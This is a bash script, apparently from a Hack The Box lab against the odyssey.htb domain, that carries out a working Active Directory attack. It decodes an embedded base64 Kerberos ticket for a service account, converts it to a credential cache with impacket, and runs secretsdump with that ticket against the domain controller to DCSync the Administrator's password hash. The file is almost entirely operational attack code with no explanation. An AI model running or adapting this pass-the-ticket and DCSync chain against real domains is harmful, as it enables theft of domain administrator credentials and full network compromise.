#!/bin/bash
export PYTHONPATH=/tmp/pylibs
echo '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' | base64 -d > /tmp/svc-aegis-stream.kirbi
ls -la /tmp/svc-aegis-stream.kirbi
python3 - <<'PY'
from impacket.krb5.ccache import CCache
ccache = CCache()
ccache.fromKRBCRED(open('/tmp/svc-aegis-stream.kirbi','rb').read())
ccache.saveFile('/tmp/svc-aegis-stream.ccache')
print('ccache ok')
PY
export KRB5CCNAME=/tmp/svc-aegis-stream.ccache
python3 - <<'PY'
import sys
sys.path.insert(0,'/tmp/pylibs')
# locate secretsdump
import runpy, os
candidates = [
 '/tmp/pylibs/impacket/examples/secretsdump.py',
 '/usr/share/doc/python3-impacket/examples/secretsdump.py',
]
for c in candidates:
    if os.path.exists(c):
        sys.argv = ['secretsdump.py','-k','-no-pass','-dc-ip','172.16.0.10','odyssey.htb/svc-aegis-stream@dc01.odyssey.htb','-just-dc-user','Administrator']
        runpy.run_path(c, run_name='__main__')
        break
else:
    # try import entry
    from impacket.examples import secretsdump
    print('found module', secretsdump)
    raise SystemExit('no secretsdump.py path')
PY
echo DCSYNC_DONE
